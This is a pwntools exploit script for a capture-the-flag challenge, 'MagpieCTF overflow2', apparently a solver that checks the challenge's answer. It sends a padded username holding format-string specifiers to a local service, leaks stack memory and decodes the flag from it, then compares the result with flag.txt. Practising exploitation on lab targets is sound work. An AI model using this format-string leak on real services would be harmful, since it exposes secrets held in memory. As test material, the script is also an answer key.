#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 14004 --libc ../../libc.so.6 ../src/overflow2.debug
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or "../src/overflow2.debug")
context.terminal = ["alacritty", "-e"]

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or "localhost"
port = int(args.PORT or 14004)
libc = ELF("../../libc.so.6")


def start_local(argv=[], *a, **kw):
    """Execute the target binary locally"""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    """Connect to the process on the remote host"""
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
tbreak main
b *vuln+229
continue
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# Stripped:   No
# Debuginfo:  Yes


def change_username(io: process | connect, payload: bytes) -> bytes:
    io.sendline(b"1")
    io.recvuntil(b"> ")  # which user?
    io.sendline(b"1")
    io.recvuntil(b"value: ")
    io.sendline(payload)
    return io.recvuntil(b"> ", drop=True)


# -- exploit --
def exploit() -> bool:
    io = start()

    io.recvuntil(b"> ")

    payload = b"A" * (0x30 + 16)
    # payload += (b"%p." * 32)
    payload += b"|%18$lx.%19$lx.%20$lx.%21$lx.%22$lx.%23$lx"
    leaked = change_username(io, payload)

    # trimming
    leaked = leaked.split(b"|")[1]
    leaked = leaked.split(b"\n")[0]
    leaked = leaked.split(b".")
    leaked = list(map(lambda x: x.rjust(6, b"0"), leaked))
    io.debug(leaked)

    # forming the flag
    flag = "".join(
        map(lambda x: bytes.fromhex(x.decode("ascii")).decode("ascii")[::-1], leaked)
    ).strip()

    # comparing to the actual flag
    with open("./flag.txt", "r") as f_in:
        buf = f_in.readline().strip()
        if buf in flag:
            io.success("MagpieCTF - overflow2 : True")
            return 0
        io.failure("MagpieCTF - overflow2 : False")
        return 1


if __name__ == "__main__":
    exit(exploit())
